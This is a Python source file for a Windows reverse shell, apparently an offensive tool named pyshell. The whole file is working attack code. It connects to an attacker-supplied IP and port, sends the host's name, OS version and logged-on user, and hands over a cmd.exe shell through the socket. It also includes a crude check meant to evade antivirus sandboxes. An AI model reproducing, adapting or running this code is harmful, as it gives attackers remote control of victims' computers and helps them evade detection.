import os,socket,subprocess,threading,sys,platform,argparse;
from time import sleep

# Handle arguments before moving on....
parser = argparse.ArgumentParser()
parser.add_argument('ip', type=str, help='IP address of remote machine', action='store')
parser.add_argument('port', type=str, help='Listening port of remote machine', action='store')
args = parser.parse_args()

ip = str(args.ip)
port = int(args.port)

def control(s,p):
    while True:
        data = s.recv(1024)
        if not data:
            os._exit(1)
        if 'exit' in data.decode('utf-8'):
            os._exit(1)
        else:
            p.stdin.write(data)
            p.stdin.flush()
    
def read_stdout(s,p):
    while True:
        line = p.stdout.readline()
        s.send(line)

def read_stderr(s,p):
    while True:
        line = p.stderr.readline()
        s.send(line)

def get_sysinfo():
    try:
        platform = str(sys.getwindowsversion())
        hostname = socket.gethostname()
        userDomain = os.environ['USERDOMAIN']
        userName = os.environ['USERNAME']
        message =  "\n\n**********\n"
        message +=  "Connection received from " + hostname + "\n"
        message += "Operating System info: " + platform + "\n"
        message += "Logged on user: " + userDomain + "\\" + userName + "\n"
        message += "Have fun! Send 'exit' to terminate the connection.\n"
        message +=  "**********\n\n"
        message = str.encode(message)
    except:
        message =  "\n\n**********\n"
        message += "Have fun! Send 'exit' to terminate the connection.\n"
        message +=  "**********\n\n"
    return message
    

def av_sandbox():
    if 'pyshell.exe' not in sys.argv[0] and 'pyshell.py' not in sys.argv[0]:
        sleep(5)
        os._exit(1)

def start_threads(s,p):
    control_thread = threading.Thread(target=control, args=[s, p])
    control_thread.daemon = True
    control_thread.start()

    read_stdout_thread = threading.Thread(target=read_stdout, args=[s, p])
    read_stdout_thread.daemon = True
    read_stdout_thread.start()

    read_stderr_thread = threading.Thread(target=read_stderr, args=[s, p])
    read_stderr_thread.daemon = True
    read_stderr_thread.start()

    try:
        p.wait()
    except KeyboardInterrupt:
        os._exit(1)

def main():
    av_sandbox()
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((ip,port))
    message = get_sysinfo()
    s.send(message)
    p=subprocess.Popen(['%COMSPEC%'], shell=True, 
                   stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    start_threads(s,p)
    

if __name__ == "__main__":
    main()
